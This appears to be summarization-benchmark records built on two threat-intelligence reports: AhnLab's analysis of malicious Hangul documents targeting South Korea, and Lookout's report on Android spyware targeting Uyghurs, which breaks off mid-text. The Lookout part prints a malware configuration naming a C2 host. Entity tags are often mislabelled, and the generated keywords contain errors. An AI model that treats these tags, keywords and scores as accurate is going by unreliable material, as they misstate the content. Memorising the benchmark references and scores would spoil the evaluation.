Word [PERSON] Processor or [ORG] HWP ) is a proprietary word processing application published by the [NORP] South [NORP] Korean company [ORG] Hancom [ORG] Inc [ORG] Hangul 's specialized support for the [NORP] Korean written language has gained its widespread use in [GPE] South [GPE] Korea , especially by the government and schools . Thus the attackers using [PERSON] Hangul as a method are those wishing to target [NORP] Korean governmental institutions . [ORG] AhnLab has analyzed the malicious [PRODUCT] Hangul files found from [DATE] September [DATE] 2016 [DATE] to [DATE] December [DATE] 2017 and summarized the attack targets , attack method , and the attack groups . [PERSON] Attack [PERSON] MethodsThe most common attack method is via email . An attacker creates an email masquerading as content that would interest the chosen target and induces the target to open the [LOC] Hangul files containing malware . Either an attacker can use the method of sending an email attachment or the attacker can alternately attempt to deliver the malware by adding a download URL in the email.[Figure [CARDINAL] 1 ] Hangul file link mailTypes of Malicious [PERSON] Hangul [PERSON] FilesHangul file attacks use methods such as vulnerability exploitation , scripts , Encapsulated PostScript ( [ORG] EPS ) , and embedded objects , which will be discussed in details below . \u00a9 AhnLab , Inc. All rights reserved [CARDINAL] 4Targeted Attacks on [NORP] South [NORP] Korean [ORG] OrganizationsAn attacker may use other executable files , such as [ORG] EXE and [ORG] LNK files disguised as [ORG] HWP files . However , though widely used , it is not considered an actual [PERSON] Hangul file attack.[Figure [CARDINAL] 2 ] [ORG] LNK file disguised as a Hangul fileVulnerabilitiesAn attacker arbitrarily modifies the content of a document to execute malware via an abnormal behavior . Attack methods exploiting this vulnerability are not easy to detect . Moreover , the compatibility of the files are greatly affected by the [PRODUCT] Hangul software version so sometimes the document takes a while to open or the document may not even be able to be opened at all . Fortunately , no new vulnerabilities have been found in [GPE] Hangul since [DATE] the [DATE] fall of [ORG] 2016.JavaScriptHancom [ORG] Office supports [ORG] JavaScript and many malware are written in JavaScript . Normally , documents containing scripts ask for user confirmation before running the script . However , a vulnerability in which a script starts without user notification was found in a [DATE] 2007 version of Hangul.[Figure [CARDINAL] 3 ] Malicious Hangul files containing [PERSON] JavaScriptThe file contains data corresponding to a [PRODUCT] Windows executable file in [ORG] JavaScript and uses it to create [PRODUCT] Windows executable files . \u00a9 AhnLab , Inc. All rights reserved [CARDINAL] 5Targeted Attacks on [NORP] South [NORP] Korean Organizations[Figure [CARDINAL] 4 ] Malicious JavaScriptEncapsulated PostScript ( EPS)Encapsulated PostScript ( [ORG] EPS ) is a script that processes [ORG] Adobe images . After the vulnerability exploiting [ORG] EPS ( CVE-2015 [DATE] - 2545 ) was found in [DATE] 2015 , the [ORDINAL] first malicious [PERSON] Hangul files written in [ORG] EPS appeared in [DATE] September [DATE] 2016 and were found continuously until [DATE] January [DATE] 2018.[Figure [DATE] 5 ] Examples of attacks using [ORG] EPS scriptsCurrently malicious scripts written in [ORG] EPS can not run in [GPE] Hangul with the latest security update . However , attacks using this vulnerability will continue until a new vulnerability is found . Therefore , users must apply the latest security updates to avoid damage from [ORG] EPS scripted attacks . Embedded ObjectsObject embedding itself is not a vulnerability but it is a way to attach executable codes in a document and then induce a user to click and execute it . It can be used by attackers to disguise malware in the form of an annex within the document . \u00a9 AhnLab , Inc. All rights reserved [CARDINAL] 6Targeted Attacks on [NORP] South [NORP] Korean OrganizationsThere is also a type of document that uses an image of a notification window as seem in Figure [CARDINAL] 6 . When the user clicks the \" OK \" button to close the window , the inserted malware is executes.[Figure [CARDINAL] 6 ] Malicious Hangul document disguised as a notification windowAmong the embedded objects , the executable file asks the user whether to run it . You can see the path where the file is saved through the notification window as in Figure [CARDINAL] 7.[Figure [CARDINAL] 7 ] A pop - up when running an executable file with an inserted objectStatus of malicious [PERSON] Hangul document filesA total of [CARDINAL] 135 malicious [LOC] Hangul [LOC] document files were collected over [DATE] 16 [DATE] months from [DATE] September [DATE] 2016 [DATE] to [DATE] December [DATE] 2017 by [ORG] AhnLab . The [DATE] monthly statistics for this data is as shown in [ Table 1 ] . \u00a9 AhnLab , Inc. All rights reserved 7Targeted Attacks on [NORP] South [NORP] Korean Organizations[Table [CARDINAL] 1 ] Number of malicious [PERSON] Hangul document files detected by monthThe percentages of attacks by their various types were 75 % [ORG] EPS , [PERCENT] 14 % vulnerability exploitation , [PERCENT] 7 % object embedding , and scripts came in at [PERCENT] 4 % . [ORG] EPS was the most used method.[Figure 8 ] Ratio of attack methods using malicious [WORK_OF_ART] Hangul [WORK_OF_ART] filesAnd the collected information by category were [PERCENT] 18 % on general information ( on products , security , announcements , and speech ) , [PERCENT] 17 % on [GPE] North [GPE] Korea , [PERCENT] 17 % on virtual money , [PERCENT] 14 % on finance , and 8 % on resumes . \u00a9 AhnLab , Inc. All rights reserved 8Targeted Attacks on [NORP] South [NORP] Korean Organizations[Figure [CARDINAL] 9 ] Ratio of content of malicious [PERSON] Hangul filesIt seems like the attacker is targeting individuals working on things related to [GPE] North [GPE] Korea ( [NORP] North [NORP] Korean defectors , [NORP] North [NORP] Korean human rights activists , [NORP] North [NORP] Korean researchers , journalists , etc.).AhnLab analyzed the content of malicious [PERSON] Hangul document files , attack techniques , and malware source codes to find the following information . [ORDINAL] First , the attackers can be divided into [CARDINAL] three groups ( A , B , and C ) where Group A ( 26 % ) and [ORG] Group B ( 48 % ) were responsible for 74 % of the attacks , comprising most of the attacks . Other than the [CARDINAL] three groups , [PERCENT] 25 % of the attacks are unclassified , meaning that there could be more attack groups revealed upon later analysis.[Figure [CARDINAL] 13 ] Ratio to attack groups using malicious [PERSON] Hangul files \u00a9 AhnLab , Inc. All rights reserved [WORK_OF_ART] 9Targeted [WORK_OF_ART] Attacks on [NORP] South [NORP] Korean [NORP] OrganizationsChange in [PERSON] Malware [PERSON] Source [PERSON] CodesThe malware that exploits [PERSON] Hangul document files are generally ' downloaders ' that download other malware and ' backdoors ' that allow remote control . The most common form is the downloader . The downloader downloads malware from a specific address . If files can be downloaded from a specific address , it is even possible to replace the old malware with new malware . It can also include a backdoor that can remotely manipulate the contents of an infected computer . In the past , it was common to create and run a backdoor on a user 's computer using a vulnerability in [GPE] Hangul . However , most malware found since [DATE] September [DATE] 2016 runs only in the computer \u2019s memory . This seems to be a technique to bypass behavior - based diagnostics of security solutions which detect the pattern of malware in document files . We have also found cases where files were created , but only executed when [PERSON] Hangul was running . Attack groupsIn [DATE] 2017 , there were [CARDINAL] at [CARDINAL] least [CARDINAL] three groups using [PRODUCT] Hangul files for attacks -note that classification of attack groups can be divided or merged depending on the development of any new leads . Among them , the attack targets of the [CARDINAL] two groups that actively used [PRODUCT] Hangul files for attack were clear . Group [ORG] A [ORG] - [ORG] Red [ORG] EyesGroup A is also known as [ORG] Red [ORG] Eyes , [ORG] Group [CARDINAL] 123 , [ORG] ScarCurf , [GPE] APT37 , [PERSON] Reaper , and [PERSON] Ricochet [PERSON] Chollima . From the analysis results , it was deemed that the main target of this group are individuals working in the fields related to [GPE] North [GPE] Korea , such as [NORP] North [NORP] Korean defectors , [NORP] North [NORP] Korean human rights activists , [NORP] North [NORP] Korean researchers , and journalists . In addition , documents related to the military were included in attack cases . The names of the malicious [PRODUCT] Hangul file used in this attack group are as follows : \u00a9 AhnLab , Inc. All rights reserved [CARDINAL] 10Targeted Attacks on [NORP] South [NORP] Korean Organizations[Table [CARDINAL] 2 ] Malicious Hangul document file names used in attacks by [ORG] Group [ORG] AThis group created malware using the [ORDINAL] first [ORG] EPS in [DATE] September 2016.The Hangul document , disguised as a North Korean New Year Address for [DATE] January [DATE] 2017 , is in the form of an embedded object . Information about malware creators can be gained using the document . For example , looking at the file path \u2018 C:\\Users\\pad-2\\AppData\\Local\\Temp\\Hwp ( 3).exe \u2019 for object insertion , we can find that the name of the the creator may be [NORP] Korean or someone familiar with [NORP] Korean . We are tracking malware produced by the same group through related strings.particular , lookingcreatorpad-2.atthestringssuchisIn[Figure [CARDINAL] 14 ] [ORG] Malware maker information contained in a malicious [PERSON] Hangul document fileIn [DATE] late [DATE] October [DATE] 2017 , the same group used [ORG] Microsoft [ORG] Word 's [ORG] Dynamic [ORG] Data [ORG] Exchange ( DDE ) document file for an attack . In [DATE] April [DATE] 2017 , this attack group released a [PERSON] Hangul file with a malware to destroy hard disks . When the malware is executed , it destroys the content of the hard disk , reboots , and displays only a message that reads ' Are you Happy ? ' . \u00a9 AhnLab , Inc. All rights reserved [CARDINAL] 11Targeted Attacks on [NORP] South [NORP] Korean Organizations[Figure [CARDINAL] 15 ] Booting screen after hard disk destructionMalware of this attack group contains a character string that is a typical program database ( [ORG] PDB ) file format . Through this PDB- related string , we can guess the attacker 's malware version and malware type.[Figure [CARDINAL] 16 ] PDB contents by versionThis attack group was known for an attack using a zero [DATE] - day flash file at [DATE] the [DATE] end [DATE] of [DATE] January [DATE] 2018 . They are a new group in the center of attention since a report was published on the group in [DATE] February [DATE] 2018.Group BGroup B is believed to be the group associated with the [DATE] 2014 [ORG] Sony [ORG] Pictures hacking . Since [DATE] 2014 , this group has attacked defense industries and large corporations in [GPE] Korea , and is focused on attacking virtual money exchanges and virtual currency - related laboratories in [DATE] 2017 . It impersonated a financial committee as well as an attorney general , etc . , and disguised important files as the preparatory documents of a tax investigation , transactions of suspected corporate body , and other content relevant to an investigation . \u00a9 AhnLab , Inc. All rights reserved [CARDINAL] 12Targeted Attacks on [NORP] South [NORP] Korean Organizations[Table [CARDINAL] 3 ] Malicious document file names used in the attacks of [ORG] Group [ORG] BThis group mainly used [ORG] EPS , but the scripting method is quite different compared to [ORG] Group A.Group C[Figure [CARDINAL] 17 ] Malicious [ORG] EPS used by [ORG] Group [ORG] BIn [ORG] Group [ORG] C , only the [PERSON] Hangul file in an object embedded type was found in [DATE] June [DATE] of [DATE] 2017 . However , analysis of the embedded executable file shows that there are [CARDINAL] more [CARDINAL] than [CARDINAL] 40 variants and that they have been active since [DATE] July [DATE] 2015.Malware is embedded as an object in the Hangul document file , and when the user clicks it , the downloader runs and downloads additional malware from url At the same time , it downloads the \u00a9 AhnLab , Inc. All rights reserved 13Targeted Attacks on [NORP] South [NORP] Korean Organizationsnormal Hangul file from url and displays the contents of the \" annex.hwp \" file so that the user does not know about the malware infection.[Figure [CARDINAL] 17 ] is the downloaded ' annex.hwp ' , which contains the content from a [NORP] North [NORP] Korean human rights civilian organization activity support project . Also , the object embedded [PERSON] Hangul file shows that the user name of the malware maker is ' easy . \u2019[Figure [CARDINAL] 18 ] Information of the maker in a malicious [PERSON] Hangul document [CARDINAL] fileAfter the analysis of the downloader variants , the name of the [PERSON] Hangul file to download is shown in [ Table 4].[Table [CARDINAL] 4 ] Names of download files used for attack by [ORG] Group CApproximately [CARDINAL] 25 backdoor variants downloaded by the downloader have been identified and were [ORDINAL] first found in [DATE] July [DATE] 2015 . The file names of the backdoors are shown in [ Table 5].[Table [CARDINAL] 5 ] Names of backdoor file used for attack by [ORG] Group [ORG] CGroup [ORG] C uses [ORG] Mutex as a downloader and a backdoor as shown in [ Table 6 ] . \u00a9 AhnLab , Inc. All rights reserved [CARDINAL] 14Targeted Attacks on [NORP] South [NORP] Korean Organizations[Table [CARDINAL] 6 ] Mutex used in malware in [FAC] Group [FAC] C attacksThe target of the attack is identified as a [NORP] North [NORP] Korean human rights group for now . However , we can not identify specific attack targets as we could not check other [GPE] Hangul files . Group C seems to be different from [ORG] Group [ORG] A so far , but if the main target of this group is [GPE] North [GPE] Korea related workers , association with [ORG] Group [ORG] A can not be excluded . [ORG] OtherIn [DATE] November [DATE] 2017 , a [PERSON] Hangul file contained [PERSON] Ursnif , a financial information hijacking malware , was also found . For documents containing [PERSON] Ursnif variants , the username was the name of a famous [NORP] Korean company , and the path to the object was C:\\Users\\User Name\\Desktop\\DuranDuran\\Sample\\patch39.exe.[Figure [CARDINAL] 19 ] File path \u00a9 AhnLab , Inc. All rights reserved 15Targeted Attacks on [NORP] South [NORP] Korean OrganizationsResponse and PreventionAhnLab \u2019s world recognized anti - malware solution [PERSON] V3 diagnoses Hangul malware . The aliases identified by the latest update in order to avoid damages . In addition , when opening a Hangul document , users should be careful about the executable files that are embedded inside , such as links , images , movies , and documents . Attackers have been exploiting various methods of attack over [DATE] the [DATE] past [DATE] decade . Fortunately , there is no new vulnerability to exploit and use to attack by modifying a Hangul document file . However , attacks aiming domestic users such as [PERSON] Hangul attacks will steadily continue . [CARDINAL] Reference[1 ] [ORG] Korean [ORG] MalDoc [ORG] Drops Evil [EVENT] New [EVENT] Years [EVENT] Presents ( url Introducing ROKRAT ( url ROKRAT Reloaded ( url Korea In The Crosshairs ( url Flash 0 [DATE] - Day In The Wild : Group [CARDINAL] 123 At The [PERSON] Controls ( url wild.html)[6 ] APT37 research/2018/02 / apt37 - overlooked - north - korean - actor.html)(Reaper ): The Overlooked [NORP] North [NORP] Korean Actor(url \u00a9 AhnLab , Inc. All rights reserved [CARDINAL] 16", "generated_text": "analysis; AhnLab; malware; South Korean; Hangul; Malware; victims; the attack; Southeast Korean; employees; North Korea; virtual currency; Southeast Asia; September 2016; December 2017; a backdoor; JavaScripts; Encapsulated PostScript; EPS; Embedded Objects; the Hangul file; the EPS method; the attackers; JavaScript vulnerabilities; the EPS method; the malware; the Hangul File; the attackers; the government; the Hangul document file; the code; C2; the server; the EPS process; the Hangul File; the memory; the attackers; Windows; a vulnerability; a security update; the malware; the group; the use.", "ref_text": "<START-1>The PDF analyzes targeted attacks against South Korean organizations from September 2016 to December 2017 using malicious Hangul document files. Hangul is a Korean proprietary word processor widely used in South Korea, especially by the government. Attackers delivered the malware via email attachments or links to malicious Hangul files hosted on remote servers. Various techniques were used including vulnerabilities, JavaScript, Encapsulated PostScript (EPS), and embedded objects. EPS attacks were the most common. AhnLab identified 3 main attack groups - Group A targeted those connected to North Korea, Group B focused on virtual currency entities, and Group C targeted a North Korean human rights group. Groups A and B were responsible for most attacks. Payloads included downloaders, backdoors, and hard drive wiping malware. Earlier attacks directly installed backdoors through Hangul exploits but recent methods run malware only in memory, likely to evade detection. No new Hangul vulnerabilities have emerged since late 2016 meaning victims can prevent attacks by patching. Embedded objects still pose a threat however. AhnLab's analysis aims to raise awareness of the ongoing threat to South Korean entities, especially government, from targeted attacks abusing the popular Hangul software. Applying the latest Hangul updates and caution around objects are recommended. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5737265415549597, "gpt3/lexical/rouge_rouge2": 0.18867924528301885, "gpt3/lexical/rouge_rougeL": 0.3109919571045576, "gpt3/lexical/rouge_rougeLsum": 0.3109919571045576, "gpt3_generated_text": ["This article by AhnLab Security Emergency Response Center (ASEC) analyzes targeted attacks on South Korean organizations using Hangul files, a word processing application widely used in South Korea. The analysis is based on malicious Hangul files found between September 2016 and December 2017. The attackers primarily target employees of North Korea-related businesses and virtual currency-related businesses. The attack methods include exploiting vulnerabilities, JavaScripts, Encapsulated PostScripts (EPS), and embedded objects. The attackers can be divided into three groups, with two of the groups actively using Hangul files. Attacks after September 2016 are mainly executed in the memory of a computer to bypass behavior-based diagnostics of security solutions. No new malware exploiting Hangul's vulnerabilities has been found since the second half of 2016, indicating the attackers are exploiting patched vulnerabilities. However, embedded object type malware found in Hangul files still poses a threat. The most common attack method is via email, either through attachments or download URLs. Overall, South Korean organizations should conduct the latest Hangul security update to prevent attacks."]}, {"split_name": "val", "sample_id": "val_41", "prompt_text": "Extract the keywords: [ORG] SECURITY RESEARCH [ORG] REPORTMobile [ORG] APT [ORG] Surveillance Campaigns Targeting UyghursA collection of long - running [ORG] Android tooling connected to a [NORP] Chinese mAPT actorJune 2020GoldenEagleFindingsMalware detailsGoldenEagle and [ORG] CarbonSteal convergence29293233C2 infrastructure and connections with other malware 34About LookoutAcknowledgementsAppendix A : Targeted countries373738Appendix B : Indicators of compromise 40ContentsExecutive [ORG] SummaryKey FindingsSilkBeanFindingsTargetingMalware details367789Command and control infrastructure and possible [CARDINAL] 11 distribution mechanismsConnections to other [PERSON] Uyghur - targeted [CARDINAL] 12 surveillancewareDoubleAgentFindingsMalware details181819DoubleAgent connection to other malware families [CARDINAL] 22CarbonStealFindingsMalware detailsCarbonSteal C2 infrastructure and [ORG] APT 15 links23232426Executive [ORG] SummaryThe [ORG] Lookout [ORG] Threat [ORG] Intelligence team has discovered [CARDINAL] four [ORG] Android surveillanceware tools , which are used to target the [ORG] Uyghur ethnic minority group . Our research indicates that these [CARDINAL] four interconnected malware tools are elements of much larger mAPT ( mobile advanced persistent threat ) campaigns that have been active for [DATE] years . Although there is evidence that the campaigns have been active since [CARDINAL] at [CARDINAL] least [CARDINAL] 2013 , Lookout researchers have been monitoring the surveillanceware families \u2014 [NORP] SilkBean , DoubleAgent , [ORG] CarbonSteal and [ORG] GoldenEagle \u2014 as far back as 2015.The mAPT threat actors behind this activity possess a mobile arsenal containing [CARDINAL] at [CARDINAL] least [CARDINAL] four other [ORG] Android surveillance tools publicly known as HenBox1 , PluginPhantom2 , [PERSON] Spywaller3 and DarthPusher4 . By examining the surveillanceware apps , their signing certificates and supporting command and control ( C2 ) infrastructure , we have discovered connections between these malware tools and the actors behind them which we detail in this report . Evidence suggests that some of the mAPT activity described in this report is also publicly associated with desktop [ORG] APT activity in [GPE] China5 , a theme which is increasingly common with mobile malware tooling . Lookout researchers have evidence to suggest that while the main target of this activity is indeed the [ORG] Uyghur ethnic minority in [GPE] China , these tools have also been used to target [ORG] Uyghurs living outside [GPE] China , [NORP] Tibetans , and [NORP] Muslim populations around the world . Titles and in - app functionality suggest targets speak a variety of languages including : [PERSON] Uyghur ( in all its [CARDINAL] four scripts : [LANGUAGE] Arabic , [NORP] Russian , Uyghur Cyrillic and [NORP] Chinese ) , [LANGUAGE] English , [LANGUAGE] Arabic , [NORP] Chinese , [NORP] Turkish , [GPE] Pashto , [NORP] Persian , [NORP] Malay , [NORP] Indonesian , [NORP] Uzbek and [ORG] Urdu / Hindi . The development timeline and targeting of these families also appear to align with [NORP] Chinese national security directives and \u201c counter - terrorism \u201d efforts as defined by the [NORP] Chinese government , perhaps suggesting a broader strategic goal behind the campaign . Lookout researchers have observed a peak in malware development beginning in [DATE] 2015 , which coincides with the \u201c [WORK_OF_ART] Strike [WORK_OF_ART] Hard [WORK_OF_ART] Campaign [WORK_OF_ART] against [WORK_OF_ART] ViolentTerrorism \u201d ( ) campaign [PERSON] inXinjiang that began in [DATE] May [DATE] 2014 , as well as the creation of [ORG] the [ORG] National [ORG] Security [ORG] Strategic [ORG] Guidelines , the National Security Law and the Counterterrorism Law in [CARDINAL] 20156.Additionally , the languages , countries , and services that were observed targeted by the mAPT are in line with [GPE] China \u2019s official list of \u201c [CARDINAL] 26 Sensitive Countries , \u201d which according to public reporting , has been used by [NORP] Chinese authorities as targeting criteria . During our research , we found evidence of [CARDINAL] at [CARDINAL] least [CARDINAL] 14 of the [CARDINAL] 26 countries being targeted by the malware campaigns discussed in this report.1 url url url url url url url showing the countries targeted by the mAPT activity discussed in this report . Users of the Lookout mobile security products are protected from all these threats . According to our data , none of the malicious apps covered by this report here were available on Google Play . A sample of [ORG] DoubleAgent has previously been reported to target [LOC] the [LOC] Tibetan [LOC] people8 and evidence found in our investigation suggests the surveillanceware classified as [ORG] GoldenEagle may also target the same group . While [ORG] SilkBean is a relatively small and targeted family for [PERSON] Uyghur individuals , shared infrastructure between [ORG] SilkBean and DoubleAgent suggests that the [CARDINAL] two are operated by the same actor and have been for [DATE] many [DATE] years . That same infrastructure has also been seen communicating with samples of the malware families [ORG] CarbonSteal , [ORG] HenBox , [ORG] PhantomPlugin , [PERSON] Spywaller and DarthPusher.8 url samplesHenBoxFireEye [PERSON] GREF reportSigned samplesC2SilkBeanSharedinfrastructureDoubleAgentSigning certi\ufb01catesShared C2 IP deliveringXSLCmd malwareShares [ORG] C2 [ORG] IP addressC2SpywallerGoldenEagleShared uniqueWeChat [ORG] IDSigned samplesCarbonStealUnique code overlapMap showing the countries targeted by the mAPT activity discussed in this report . Lookout researchers have connected these [CARDINAL] four novel and publicly unknown [ORG] Android surveillance tools together in the ways shown above . Themalware activity primarily targets the [ORG] Uyghur ethnic group . These families share command and control ( C2 ) infrastructure , signer certificates , and overlapping code structure , indicating common developers and much larger ongoing malware campaigns . Some C2 infrastructure is alsoassociated with publicly reported [ORG] APT activity on the use of the XSLCmd backdoor9 associated with GREF.9 url [PERSON] FindingsFour new [ORG] Android surveillanceware tools have been discovered by Lookout.\u2022 DoubleAgent and [ORG] GoldenEagle also target [NORP] Tibetans , inferred from their titles as well as public [ORG] reporting.10\u2022 [ORG] Application titles have also been seen in [CARDINAL] at [CARDINAL] least [CARDINAL] 10 different languages - Uyghur ( in all its [CARDINAL] four scripts : [LANGUAGE] Arabic , [NORP] Russian , Uyghur Cyrillic and [NORP] Chinese ) , [LANGUAGE] English , [LANGUAGE] Arabic , [NORP] Chinese , [NORP] Turkish , [GPE] Pashto , [NORP] Persian , [NORP] Malay , [NORP] Indonesian , [NORP] Uzbek and [ORG] Urdu / Hindi . All [CARDINAL] four malware families are connected to each other through shared command and control infrastructure , signing certificates as well as code and target overlap.\u2022 Samples of DoubleAgent , [ORG] GoldenEagle and [PRODUCT] SilkBeanshare [PRODUCT] C2 infrastructure indicating that the same actor is behind the deployment of these malware tools.\u2022Infrastructure publicly associated with the actor known as [ORG] GREF in [DATE] 2018 has been found to be linked directly to [ORG] CarbonSteal samples . In past public reporting , [PERSON] GREF has also been referred to as APT15 , [ORG] Ke3chang , [ORG] Mirage , Vixen Panda and [ORG] Playful Dragon.\u2022 Overlap of non - compromised signing certificatesindicates that a combination of these tools are being used in tandem by a single group of mAPT actors to target [ORG] Uyghurs and other [NORP] Muslim populations around the world.\u2022 The primary aim of these surveillanceware apps is togather and exfiltrate personal user data to a command and control server.\u2022 The apps fall into [CARDINAL] four separate malware families , eachof which has its own unique data gathering priorities and techniques . We named these families [NORP] SilkBean , DoubleAgent , [ORG] CarbonSteal and GoldenEagle.\u2022 Lookout researchers can trace some of the associatedinfrastructure as far back as [DATE] 2013 , along with changes in tooling.\u2022 These surveillanceware tools have been used inconjunction with previously reported malware families such as [ORG] HenBox , [ORG] PluginPhantom , [PERSON] Spywaller and [PERSON] Darth [PERSON] Pusher . Targets of these malware families are primarily [ORG] Uyghurs , both in [GPE] China and around the world , but also include [NORP] Tibetans and possibly wider [NORP] Muslim communities.\u2022 Application titles and in - app functionality of the malwaresamples suggest the targets of all [CARDINAL] four surveillanceware families are the [NORP] Uyghur [NORP] Muslim ethnic minority group , centered in [GPE] Xinjiang , [GPE] China . Some applications and [CARDINAL] C2 domains appear to impersonate [ORDINAL] third - party [LOC] Uyghur language app stores and focus on [PERSON] Uyghur - targeted apps and services.\u2022 Evidence suggests [ORG] Uyghur communities in at leastfourteen other countries may also be targeted . Content within malware samples reference local services and news outlets in countries such as [GPE] Turkey , [GPE] Syria , [GPE] Kuwait , [GPE] Indonesia and [PERSON] Kazakhstan.10 url In [DATE] January [DATE] 2019 , Lookout researchers began investigating [ORG] SilkBean , a small and targeted [ORG] Android surveillanceware tool focusing on the [ORG] Turkic minority ethnic group , the [ORG] Uyghurs . The malware samples mainly trojanized applications for [PERSON] Uyghur / Arabic focused keyboards , alphabets , and plugins . A hallmark of [ORG] SilkBean is the comprehensive [ORG] RAT ( remote access trojan ) functionality that allows an attacker to execute over [CARDINAL] 70 different commands on an infected device . [ORG] SilkBean is delivered via applications that possess malicious functionality , but mimic titles and icons that a target may want to install . The legitimate app with functionality the user expects is packaged within the malware and installed after [ORG] SilkBean successfully infects a target device . Tracking SilkBean throughout [DATE] 2019 led to the discovery that the actor behind this malware had a much larger [ORG] Android toolset than was previously thought , and had also perhaps expanded their target group . Malware samples connected by common command and control infrastructure over [DATE] a [DATE] number [DATE] of [DATE] years suggests that the same group behind the activity of [ORG] SilkBean was also making use of the malware families known as DarthPusher11 , HenBox12 , PluginPhantom13 and the next surveillanceware family presented here : DoubleAgent . The languages used in the titles and in - app content include : [PERSON] Uyghur ( in all its [CARDINAL] four scripts : [LANGUAGE] Arabic , [NORP] Russian , [PERSON] Uyghur [PERSON] Cyrillic , and [NORP] Chinese ) , [LANGUAGE] English , [LANGUAGE] Arabic , [NORP] Chinese , [NORP] Turkish , [GPE] Pashto , [NORP] Persian , [NORP] Malay , [NORP] Indonesian , and [ORG] Urdu / Hindi . Locations referenced in these titles also point to individuals living in or visiting countries such as [GPE] Syria , [GPE] Kuwait , [GPE] Indonesia and [GPE] Turkey . Many topics reference either popular [NORP] Muslim apps or applications that individuals who are interested in [GPE] Islam might find entertaining . Other titles and domains reference legitimate services , websites and [ORDINAL] third party app stores that serve Uyghur - relevant content only . Logging statements indicate that the developers of [NORP] SilkBean speak [NORP] Chinese . [NORP] Chinese names and locations are also mentioned in non - compromised signer certificates used to sign samples of this malware , although this information is easy to falsify during development . Similarities in coding techniques and naming conventions between [ORG] SilkBean and other known [NORP] Chinese - developed malware families also add weight to this theory.11 url url url The majority of [NORP] SilkBean samples acquired by Lookout in [DATE] 2016 and [DATE] 2017 have titles like com.google.pay and com.android . google.service , which the average user might find innocuous on an [ORG] Android device . Most later samples had app icons and titles identifying them as [PERSON] Uyghur targeted as shown in the following figure . While [CARDINAL] at [CARDINAL] least [CARDINAL] two samples have a direct reference to [PERSON] Uyghur specific applications , such as [PERSON] Uyghur [PERSON] Keyboard , ( [PERSON] Uyghur ) [GPE] Alphabet and [PERSON] Uyghur [PERSON] Plugin , one is titled \u201c \u201d which may be loosely translated as \u201c Independence \u201d in [LANGUAGE] Arabic . Another recent sample is titled [ORG] TalkBox , a push- to - talk messaging application commonly used in [GPE] China . \u0644\u0644\u0627\u0642\u0649\u062a\u0633\u0649\u0626A [NORP] SilkBean sample ( SHA-1 : [CARDINAL] 3da34aaf95ffcb5c5d36c2a9fc5 [CARDINAL] 42c1b08c36d2f ) uncovered in [DATE] June [DATE] 2019 prompted a closer look at the family . It had the title \u201c \u201d , which translates to \u201c [WORK_OF_ART] Syria [WORK_OF_ART] News \u201d in [LANGUAGE] Arabic . Despite the app title , the content of the application was still specifically [PERSON] Uyghur - focused - all news stories could be viewed in the [CARDINAL] three different scripts used for the [PERSON] Uyghur language.\u0627\u064a\u0631\u0648\u0633 \u0631\u0627\u0628\u062e\u0627Icons and screenshots ofSilkBean samples which areexamples of language - specifictargeting used by this threat , where the same news article ispresented in a number of [ORG] Uyghurlanguage scripts.8Screenshots from a sample ofSilkBean masquerading as [ORG] aUyghur [ORG] Keyboard application . The [ORDINAL] first stage of the applicationasks the user for an updateimmediately and uses thisopportunity to install anotherapplication which containslegitimate functionality , alsoretrieved from it \u2019s assets folder(non - rooted device functionality).The application does not attemptto hide its icon either . As isdiscussed later however , thecurrent [CARDINAL] C2 content encouragesusers to disable this securitysetting and allow app installsfrom unknown locations . [PERSON] Malware details Apps belonging to the [NORP] SilkBean family have extensive surveillance and remote - control capabilities as is evident from the following list of [CARDINAL] 70 commands the app can receive from its C2 and perform . CMD_ADDRESSBOOK [NORP] CMD_WATCHAPP_RECORD_SYNThe list of all commands that can be received and processed by [NORP] SilkBean samples . Note the get and delete commands for [ORG] Weibo information on an infected device , which is a popular social media site in China.9Many samples of [ORG] SilkBean had most of their malicious functionality in a [ORDINAL] second stage and read command and control information from a settings file in the assets folder.{\u201cApp_run_name \u201d : \u201d \u201d , \u201c Aram_type\u201d:\u201dtrue \u201d , \u201c [WORK_OF_ART] mm_path\u201d:\u201dC:\\\\Program [WORK_OF_ART] Files ( x86)\\\\ryingsoft\\\\mmserver\\\\data\\\\center\\\\mm\\\\9365e76b - f9e3 - 4ac7 - 881f - c93ab1077a60.apk\u201d,\u201cMm_type\u201d:0 , \u201c [WORK_OF_ART] other_path\u201d:\u201dC:\\\\Program [WORK_OF_ART] Files ( x86)\\\\ryingsoft\\\\mmserver\\\\data\\\\center\\\\mm\\\\aa42b5bb [PERSON] - f43e-4841 [PERSON] - 80cd-917680909614.apk\u201d,\u201cPort\u201d:7082 , \u201c Rs_type\u201d:\u201d3 \u201d , \u201c server_ip\u201d:\u201dwww.turkyedu - online.com \u201d , \u201c Sock_type\u201d:0 , \u201c Update_config\u201d:\u201cCall_type\u201d:2431 , \u201c Cyc_time\u201d:\u201d60 \u201d , \u201c Save_path\u201d:\u201dc:\\\\auto_path \u201d , \u201c Screen_state\u201d:1 , \u201c Start_time\u201d:\u201d22:00 \u201d , \u201c Stop_time\u201d:\u201d23:00 \u201d , \u201c Time_type\u201d:1 , \u201c trans_type\u201d:\u201dWIFI ONLY \u201d } , \u201c Use_weixin\u201d:0 , \u201c version\u201d:\u201d2016 - 02 - 18new\u201d{}Top : [PERSON] Files seen in the assets folder of a sample of [ORG] SilkBean . The file [CARDINAL] 112 is a sqlite database used to store some data for the application . The file [CARDINAL] 113 is the [ORDINAL] second stage and contains malicious functionality . com.kittyhomes.uyghurinputkeyboard is the application that contains legitimate functionality and setting.prop is the encrypted file containing C2 information . Bottom : In all cases , this settings file is encrypted using a set of bitwise shifting operations . Once decrypted , it contains a JSON Object , similar to the [CARDINAL] one shown above . The values of the \u201c mm_path \u201d and [NORP] SilkBean samples are [NORP] www.englishedu - online[.]com and www.turkyedu - online[.]com . Navigating to these sites early on in the investigation redirected the request to a [ORDINAL] third - party app store called [ORG] www.islamapk[.]com which hosts [PERSON] Uyghur and [NORP] Islamic specific applications for download . More recently however , navigating to these sites directs the user to an exact copy of url an adult content site , which also resolves to the same [ORG] IP address as [LAW] the [LAW] SilkBean [LAW] C2s . Site content encourages users to modify [ORG] Android security settings , thereby allowing the installation of applications from an \u201c Unknown Source\u201d . All applications offered on this site ( SHA-1 : with a compromised key , but do not appear to contain any malicious functionality consistent with [ORG] SilkBean and also do not have surveillanceware capabilities . However , all [CARDINAL] three applications have the capability to install an application package . This is a behavior explicitly explained away by the content on the web site as an expected \u201c update \u201d of the app . This behavior might provide insight into a possible distribution mechanism for the malicious apps . Lastly , 